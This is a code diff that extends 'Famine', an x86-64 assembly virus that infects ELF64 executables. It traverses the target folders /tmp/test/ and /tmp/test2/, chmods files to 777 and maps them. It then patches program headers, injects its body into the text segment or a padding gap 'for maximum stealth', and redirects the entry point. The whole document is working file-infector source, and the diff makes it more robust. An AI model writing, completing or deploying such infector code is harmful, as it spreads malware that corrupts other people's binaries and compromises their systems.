@@ -1,10 +1,4 @@
-; TODO
-; [OK] Close all mappings and file descriptors
-; Inject in gap when possible
-; Check if no bug when there are files other than ELF64 in the folder
-; Add check to see if file is EXEC or DYN
-
-; mapping closed after loop exits when file already infected
+; 1298 bytes
 
 %include "strife.inc"
 
@@ -37,7 +31,7 @@ _start:
 	; === Deleting our 'famine' struct from the stack
 	add rsp, famine_size
 
-	; === Placing original entry point in r15 (see comments at the end of file) ===
+	; === Placing original entry point in r15 (see comment at the end of file) ===
 	lea r15, [rel _start]
 	mov rsi, [rel virus_entry]
 	sub r15, rsi
@@ -113,6 +107,7 @@ _traverse_dir:
 ; ##### FILE INFECTION #####
 
 _file:
+	mov qword FAM(famine.map_ptr), 0
 	; === Concatenating the directory name and the filename ===
 	push rsi													; rsi has filename address. Save it on stack
 	lea rdi, FAM(famine.current_fpath)							; We will store the complete path in our 'famine' structure
@@ -128,6 +123,12 @@ _file:
 	movsb
 	cmp byte [rsi - 1], 0
 	jne .fname
+
+	; === chmod 777 on the file to infect, to ensure we have read-write permissions on it ===
+	lea rdi, FAM(famine.current_fpath)
+	mov rsi, 0q0777
+	mov rax, SYS_CHMOD
+	syscall
 
 	; === Opening the file to infect | open(fpath, O_RDWR, 0)
 	mov rdi, rdx												; rdx had the complete file path address
@@ -146,10 +147,11 @@ _file:
 	mov rax, SYS_LSEEK
 	syscall
 	mov FAM(famine.fsize), rax									; Saving original file size in 'famine' structure
+	mov FAM(famine.mmap_size), rax
 	cmp rax, 4
-	jl _traverse_dir.check_dir_loop
+	jl _end_file_infection
 
-	; === First mmap to read the file (format? already infected ?) | mmap(0, filesize, PROT_READ, MAP_PRIVATE, fd, 0) ===
+	; === First mmap to read the file (format? already infected ?) | mmap(0, filesize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0) ===
 	xor rdi, rdi
 	mov rsi, rax
 	mov rdx, PROT_READ | PROT_WRITE
@@ -159,20 +161,27 @@ _file:
 	syscall
 	mov FAM(famine.map_ptr), rax								; Saving mapped file pointer in 'famine' structure
 	cmp rax, 0
-	jl _traverse_dir.check_dir_loop
+	jl _end_file_infection
 
 	; === Making sure the file is an ELF file ===
 	cmp dword [rax], 0x464c457f
-	jne _traverse_dir.check_dir_loop
+	jne _end_file_infection
 
 	; === Making sure the ELF file is x64 ===
 	cmp byte [rax + 0x4], 0x2
-	jne _traverse_dir.check_dir_loop
+	jne _end_file_infection
 
-	; === Getting the segment headers offset in file ===
+	; === Making sure the ELF file is ET_EXEC or ET_DYN ===
+	cmp word [rax + 0x10], 0x2
+	je .segments
+	cmp word [rax + 0x10], 0x3
+	je .segments
+	jmp _end_file_infection
+
+	; === Getting e_phoff and e_phnum ===
+	.segments:
 	add rax, elf64_ehdr.e_phoff
 
-	; === Finding the text segment in file ===
 	mov r11, [rax]												; Storing e_phoff in r11
 	add rax, elf64_ehdr.e_phnum - elf64_ehdr.e_phoff
 	movzx r14, word [rax]										; Storing e_phnum in r14
@@ -181,10 +190,11 @@ _file:
 	add rax, r11												; rax is now at the start of segment headers in file
 	xor r13, r13												; Counter to loop through segment headers
 
+	; === Finding the text segment in file ===
 	.phnum_loop:												; Iterating through segment headers
 	call _is_text_segment										; If we found the text segment, go to .found_text_segment
 	cmp r14, r13												; Else, check if we still have segments to iterate upon
-	je _traverse_dir.check_dir_loop								; If no, we didn't find the text segment. Give up for this file
+	je _end_file_infection										; If not, we didn't find the text segment. Give up for this file
 	add rax, elf64_phdr_size									; If yes, increase counter and go to next segment
 	inc r13
 	jmp _file.phnum_loop
@@ -225,18 +235,19 @@ _file:
 	sub rdi, (_finish - signature)
 	mov rax, [rel signature]
 	cmp rax, qword [rdi]										; Comparing the word 'Famine' of the signature
-	je _traverse_dir.check_dir_loop								; If the file was already infected, we ignore it
+	je _end_file_infection										; If the file was already infected, we ignore it
 
 	mov rdi, VIRUS_SIZE
 	cmp qword FAM(famine.gap_size), rdi
-	jg _inject_in_gap											; If gap_size is greater than VIRUS_SIZE
+	jg _inject_in_gap											; If gap_size is greater than VIRUS_SIZE, we will inject in gap for maximum stealth
 
 
 	; === Close the first mapping with munmap ===
 	mov rdi, FAM(famine.map_ptr)
-	mov rsi, FAM(famine.fsize)
+	mov rsi, FAM(famine.mmap_size)
 	mov rax, SYS_MUNMAP
 	syscall
+	mov qword FAM(famine.map_ptr), 0
 
 	; === Truncate the file to add 4096 bytes | ftruncate(file_fd, fsize + 4096) ===
 	mov rdi, r8
@@ -245,7 +256,7 @@ _file:
 	mov rax, SYS_FTRUNCATE
 	syscall
 	cmp rax, 0
-	jl _traverse_dir.check_dir_loop
+	jl _end_file_infection
 
 	; === Second mmap of extended file to inject virus | mmap(0, filesize + 4096, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0) ===
 	xor rdi, rdi
@@ -257,14 +268,15 @@ _file:
 	mov rax, SYS_MMAP
 	syscall
 	mov FAM(famine.map_ptr), rax								; Updating the mapped file pointer in 'famine' structure
+	add qword FAM(famine.mmap_size), PAGE_SIZE					; Update the size of the mapped file
 	cmp rax, 0
-	jl _traverse_dir.check_dir_loop
+	jl _end_file_infection
 
 
 	call _text_seg_header_patch
 
 
-	; === Patching all segment headers corresponding to segment located after the text segment in file. ===
+	; === Patching all segment headers corresponding to segments located after the text segment in file. ===
 	; === We add 4096 to the offset of these segments, since we will shift everything by PAGE_SIZE ===
 	mov rax, FAM(famine.txt_header)
 	add rax, FAM(famine.map_ptr)
@@ -360,28 +372,27 @@ _file:
 	mov r14, FAM(famine.orig_entry)
 	mov qword [rdi - 16], r14
 
-	; === Delete the second file mapping with munmap ===
+	jmp _end_file_infection
+
+
+
+_end_file_infection:
+	.munmap:
 	mov rdi, FAM(famine.map_ptr)
-	mov rsi, FAM(famine.fsize)
-	cmp byte FAM(famine.inject_in_gap), 0
-	jne .no_add
-	add rsi, PAGE_SIZE
-	.no_add:
+	cmp rdi, 0													; If we don't have any file mapping yet, just close the file
+	je .close_file
+	mov rsi, FAM(famine.mmap_size)
 	mov rax, SYS_MUNMAP
 	syscall
-
-	; === Close the infected file ===
+	.close_file:
 	mov rdi, r8
 	mov rax, SYS_CLOSE
 	syscall
-
 	jmp _traverse_dir.check_dir_loop
 
 _inject_in_gap:
-	mov byte FAM(famine.inject_in_gap), 1
 	call _text_seg_header_patch
 	jmp _file.write_virus
-
 
 _text_seg_header_patch:
 	; === Increasing text segment header p_filesz and p_memsz of VIRUS_SIZE for stealth ===
@@ -420,8 +431,6 @@ _exit:
 target_1	db		"/tmp/test/",0x0
 target_2	db		"/tmp/test2/",0x0
 signature	db		"Famine version 1.0 (c)oded by qroland",0x0
-fill		db		"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",0x0
 host_entry	dq		_exit
 virus_entry	dq		_start
 _finish:
-
